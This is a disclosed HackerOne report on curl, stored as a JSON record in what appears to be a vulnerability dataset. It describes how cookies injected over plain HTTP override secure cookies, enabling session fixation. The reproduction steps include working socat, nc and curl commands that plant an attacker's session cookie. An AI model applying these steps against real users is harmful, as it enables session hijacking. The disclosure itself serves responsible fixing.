{
    "reported_to": "curl",
    "reported_by": "nyymi ",
    "title": "Cookie injection from non-secure context",
    "content": "\nSummary:\nCurl allows injecting cookies over insecure HTTP connection that will then be sent to the target site when connecting over HTTPS.\nAs documented in lib/cookie.c https://github.com/curl/curl/blob/a04f0b961333e1a19848d073d8c7db9c20b2a371/lib/cookie.c#L1039 this should not be possible:\nCode 296 Bytes\n1            /*\n2             * A non-secure cookie may not overlay an existing secure cookie.\n3             * For an existing cookie \"a\" with path \"/login\", refuse a new\n4             * cookie \"a\" with for example path \"/login/en\", while the path\n5             * \"/loginhelper\" is ok.\n6             */\nThis will allow session fixation (CWE-384) attack where the attacker replaces the session of the victim with their own. If the victim performs for example upload operations the upload will be sent to the account controlled bit he attacker.\nThis attack requires that the application in question does or can be coaxed to make accesses to the same host over insecure HTTP connection. The attacker needs to either perform Man in the Middle attack to these insecure connections, or be able to host a HTTP server on another port on the same host.\nSteps To Reproduce:\necho -ne \"HTTP/1.1 200 OK\\r\\nSet-Cookie: SESSIONID=victimstoken; secure\\r\\nContent-Length: 0\\r\\n\\r\\n\" | socat STDIN OPENSSL-LISTEN:9999,commonname=somesite.tld,reuseaddr,verify=0,key=privkey.pem,cert=fullchain.pem\ncurl -c cookies.txt -b cookies.txt https://somesite.tld:9999/\necho -ne \"HTTP/1.1 200 OK\\r\\nSet-Cookie: SESSIONID=hackerstoken; domain=somesite.tld\\r\\nContent-Length: 0\\r\\n\\r\\n\" | nc -v -l -p 3333\ncurl -c cookies.txt -b cookies.txt http://somesite.tld:3333/\nsocat OPENSSL-LISTEN:9999,commonname=somesite.tld,reuseaddr,verify=0,key=privkey.pem,cert=fullchain.pem STDOUT\ncurl -c cookies.txt -b cookies.txt https://somesite.tld:9999/\nThe following cookies are now sent by curl:\nCookie: SESSIONID=victimstoken; SESSIONID=hackerstoken\nThe order the cookies appears to depend on the order of the lines in cookie store. Depending on how the victim site interpreted the multiple SESSIONID cookies the attacker may want to try to inject the cookie before login by the victim, or after the login.\nAfter successful attack the cookie.txt looks like this:\nCode 286 Bytes\n1# Netscape HTTP Cookie File\n2# https://curl.se/docs/http-cookies.html\n3# This file was generated by libcurl! Edit at your own risk.\n4\n5.somesite.tld    TRUE    /       FALSE   0       SESSIONID       hackerstoken\n6somesite.tld     FALSE   /       TRUE    0       SESSIONID       victimstoken\nThis is CWE-384: Session Fixation.\nImpact\nCookie injection leading to CWE-384: Session Fixation and/or other similar attacks.\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "Session Fixation"
    ],
    "screenshots": {},
    "disclosed_date": 1652438640,
    "report_url": "https://hackerone.com/reports/1560324",
    "is_multi_component": false,
    "complexity": "MEDIUM",
    "novelty": "MEDIUM",
    "vuln_category": "CODE",
    "steps": [
        [
            1,
            "Set up a secure HTTPS server to receive cookies and a non-secure HTTP server to inject cookies."
        ],
        [
            2,
            "Use curl to interact with both servers, first receiving a secure cookie and then injecting a non-secure cookie."
        ],
        [
            3,
            "Observe that the non-secure cookie overwrites the secure cookie when sent to the HTTPS server."
        ]
    ],
    "vuln_description": "The vulnerability allows an attacker to inject cookies over an insecure HTTP connection that will then be sent to the target site over HTTPS, potentially leading to session fixation attacks. This occurs despite protections in place to prevent non-secure cookies from overlaying secure ones.",
    "reason": "The attack involves setting up both secure and non-secure servers and understanding the cookie handling mechanism in curl. The interaction between the secure and non-secure contexts is subtle and not immediately obvious, requiring knowledge of how cookies are stored and sent in different contexts.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}